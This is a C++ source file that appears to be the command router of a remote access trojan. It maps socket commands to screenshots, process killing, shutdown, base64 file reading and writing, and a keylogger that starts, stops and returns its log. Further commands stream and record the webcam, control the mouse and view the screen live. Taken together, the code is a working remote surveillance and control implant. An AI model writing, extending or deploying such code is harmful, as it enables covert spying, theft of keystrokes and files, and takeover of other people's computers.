#include "commands.h"

#include "ping.h"
#include "screenshot.h"
#include "app_manager.h"
#include "process_manager.h"
#include "system_power.h"
#include "file_ops.h"
#include "keylogger.h"
#include "webcam.h"
#include "mouse_control.h"
#include "screen_viewer.h"
#include "utils.h"

#include <sstream>
#include <vector>
#include <string>

static std::vector<std::string> split(const std::string& s) {
    std::istringstream iss(s);
    std::vector<std::string> out;
    std::string t;
    while (iss >> t) out.push_back(t);
    return out;
}

/** Everything after `cmd` + one space (paths / names with spaces). */
static std::string argAfterCommand(const std::string& trimmedLine, const std::string& cmd) {
    if (trimmedLine.size() <= cmd.size()) return "";
    if (trimmedLine.compare(0, cmd.size(), cmd) != 0) return "";
    if (trimmedLine.size() == cmd.size()) return "";
    if (trimmedLine[cmd.size()] != ' ') return "";
    return trim(trimmedLine.substr(cmd.size() + 1));
}

/** Second space separates base64 payload from remote path. */
static bool parseWriteFileBase64Line(const std::string& t, std::string& b64, std::string& path) {
    const std::string pfx = "WRITE_FILE_BASE64 ";
    if (t.size() < pfx.size() || t.compare(0, pfx.size(), pfx) != 0) return false;
    const std::string body = t.substr(pfx.size());
    const auto sp = body.find(' ');
    if (sp == std::string::npos || sp == 0) return false;
    b64 = body.substr(0, sp);
    path = trim(body.substr(sp + 1));
    return !b64.empty() && !path.empty();
}

// ===== ROUTER =====
std::string process(const std::string& line, SocketType client) {
    const std::string t = trim(line);
    if (t.empty())
        return jsonCommandResponse(false, "empty");

    auto parts = split(t);
    if (parts.empty())
        return jsonCommandResponse(false, "empty");

    const std::string& cmd = parts[0];

    if (cmd == "PING") return cmdPing();

    if (cmd == "SCREENSHOT") {
        return captureScreenshotJson();
    }

    if (cmd == "LIST_APPS") return cmdListApps();
    if (cmd == "START_APP_BY_NAME") return cmdStart(parts);
    if (cmd == "STOP_APP_BY_NAME") return cmdStop(parts);

    if (cmd == "LIST_PROCESSES") return listProcessesJson();

    if (cmd == "START_PROCESS") return startProcessByName(parts);

    if (cmd == "KILL_PROCESS" && parts.size() >= 2)
        return killProcessByPid(parts[1], "KILL_PROCESS");

    if (cmd == "STOP_APP_BY_PID" && parts.size() >= 2)
        return killProcessByPid(parts[1], "STOP_APP_BY_PID");

    if (cmd == "SHUTDOWN") return shutdownOrRestartJson("SHUTDOWN");
    if (cmd == "RESTART") return shutdownOrRestartJson("RESTART");

    if (cmd == "READ_FILE_BASE64") {
        const std::string path = argAfterCommand(t, "READ_FILE_BASE64");
        if (path.empty()) return jsonCommandResponse(false, "missing_path", cmd);
        return readFileBase64Json(path);
    }

    if (cmd == "WRITE_FILE_BASE64") {
        std::string b64;
        std::string path;
        if (!parseWriteFileBase64Line(t, b64, path)) return jsonCommandResponse(false, "bad_args", cmd);
        return writeFileBase64Json(path, b64);
    }

    if (cmd == "LIST_FILES") {
        const std::string dir = argAfterCommand(t, "LIST_FILES");
        if (dir.empty()) return jsonCommandResponse(false, "missing_dir", cmd);
        return listFilesJson(dir);
    }

    if (cmd == "KEYLOGGER_START") return keyloggerStartJson();
    if (cmd == "KEYLOGGER_STOP") return keyloggerStopJson();
    if (cmd == "KEYLOGGER_GET_LOG") return keyloggerGetLogJson();

    if (cmd == "WEBCAM_START") {
        return webcamStartSession(client);
    }
    if (cmd == "WEBCAM_STOP") {
        webcamStopSession();
        return "{\"ok\":true,\"command\":\"WEBCAM_STOP\"}";
    }
    if (cmd == "WEBCAM_RECORD_START") {
        return startWebcamRecordJson();
    }
    if (cmd == "WEBCAM_RECORD_STOP") {
        return stopWebcamRecordJson();
    }

    if (cmd == "MOUSE_MOVE" && parts.size() >= 3) {
        int x = std::stoi(parts[1]);
        int y = std::stoi(parts[2]);
        return mouseMoveJson(x, y);
    }
    if (cmd == "MOUSE_LEFT_CLICK" && parts.size() >= 3) {
        int x = std::stoi(parts[1]);
        int y = std::stoi(parts[2]);
        return mouseLeftClickJson(x, y);
    }
    if (cmd == "MOUSE_RIGHT_CLICK" && parts.size() >= 3) {
        int x = std::stoi(parts[1]);
        int y = std::stoi(parts[2]);
        return mouseRightClickJson(x, y);
    }

    if (cmd == "SCREEN_VIEWER_START") {
        startScreenViewer(client);
        return "{\"ok\":true,\"command\":\"SCREEN_VIEWER_START\"}";
    }

    if (cmd == "SCREEN_VIEWER_STOP") {
        stopScreenViewer();
        return "{\"ok\":true,\"command\":\"SCREEN_VIEWER_STOP\"}";
    }

    return jsonCommandResponse(false, "unknown_command", cmd);
}
